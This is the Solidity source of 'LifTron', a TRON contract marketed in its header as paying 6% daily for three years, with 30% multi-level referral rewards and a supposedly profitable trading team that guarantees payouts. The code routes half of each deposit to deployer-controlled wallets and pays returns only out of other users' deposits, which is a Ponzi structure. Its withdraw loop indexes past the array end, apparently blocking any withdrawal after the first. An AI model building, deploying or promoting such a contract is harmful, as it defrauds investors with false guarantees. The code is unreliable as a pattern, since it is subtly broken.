//SourceUnit: Liftron.sol

/**LifTron 
 - Earn 6% DAILY - 3 YEARS PERIOD
 - Join telegram group - t.me/LifTronClub
 - Total of 30% Referal Rewards - 3 Levels
/**
    This Platform is specialized for HIGH REFERAL REWARDS
    First level - 25%
    Second level - 5%
    Third level - 5%

    Owner of the platform has a "tradingFund" on the contract that will be used on 
    trading cryptocurrencies to generate additional funds for sustaining the platform, We will not solely
    rely on the investments of the investors thus we have a professional team of crypto traders that will generate additional 
    income for the platform. 

    Professional Trading Team has a quota of 8-15% income every 24 hours and it will be added to the contract balance
    to assure investors and members that the platform can sustain its daily roi for the investors. 
    We can assure all investors will be paid thru our trading program, it gives us the confidence and edge from 
    other platforms that only uses the circulating funds from the contract to pay investors. 

    "tradingFunds" - 30% (It will be used for generating funds and additional income to the platform)

    50% remaining on the contract including the tradingFunds, but remember we have to generate funds for long term and sustainable platform.
    Every 24-48 hours tradingFunds will be sent back to the contract plus 100% of the income on the trading sessions will be added to the contract.

 */

pragma solidity 0.5.9;

contract Liftron {
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }
    struct PlayerWitdraw{
        uint256 time;
        uint256 amount;
    }
    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 last_withdrawal;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        PlayerWitdraw[] withdrawals;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address payable private owner;
    address payable private marketing;
    address payable private tradingFunds;
    address payable private dev;

    uint256 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint256 private max_withdraw = 15000000000; // 15k max withdraw

    uint8[] referral_bonuses;

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    constructor() public {
        owner = msg.sender;
        marketing = msg.sender;
        tradingFunds = msg.sender;
        dev = msg.sender;

        investment_days = 1095; // 3 YEARS PERIOD OF INVESTMENT 
        investment_perc = 6570; // 6% DAILY

        referral_bonuses.push(250); //25% Referral bonus 1st Level
        referral_bonuses.push(50); // 5%
        referral_bonuses.push(50); // 5%
        
    }

    function deposit(address _referral) external payable {
         require(msg.value >= 2e7, "Zero amount");
        require(msg.value >= 20000000, "Minimum deposit");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 1500, "Max 1500 deposits per address");


        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(8).div(100));
        dev.transfer(msg.value.mul(4).div(100));
        marketing.transfer(msg.value.mul(8).div(100));
        tradingFunds.transfer(msg.value.mul(30).div(100));

        emit Deposit(msg.sender, msg.value);
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
         address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        if((player.last_withdrawal == 0) || (block.timestamp > player.last_withdrawal + 1 days)){
            player.last_withdrawal = block.timestamp;
        }

        uint256 withdraws = 0;
        for(uint256 b = player.withdrawals.length; b > 0 ;b--){
            if(player.withdrawals[b].time >= player.last_withdrawal && player.withdrawals[b].time <= (player.last_withdrawal + 1 days)){
                withdraws += player.withdrawals[b].amount;
            }
        }

        require(withdraws <= max_withdraw,"Maximum withdrawals is 15,000 trx");


        if(withdraws <= max_withdraw){

            require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

            uint256 amount = player.dividends + player.referral_bonus;

                if(amount > max_withdraw){
                    uint256 remaining = (amount - max_withdraw);
                    amount = max_withdraw;
                    player.dividends = remaining;

                }else{
                    player.dividends = 0;
                }

                player.referral_bonus = 0;
                player.total_withdrawn += amount;
                total_withdrawn += amount;

               player.withdrawals.push(PlayerWitdraw({
                    time:block.timestamp,
                    amount:amount
                }));

                msg.sender.transfer(amount);

                emit Withdraw(msg.sender, amount);
        }


    }

     function setMarketing(address payable _address) public {
        require(msg.sender == owner);
        marketing = _address;
     }

      function setDev(address payable _address) public {
        require(msg.sender == owner);
        dev = _address;
      }

       function setTradingFunds(address payable _address) public {
        require(msg.sender == owner);
        tradingFunds = _address;
       }

        function setOwner(address payable _address) public {
        require(msg.sender == owner);
        owner = _address;
        }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }



    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}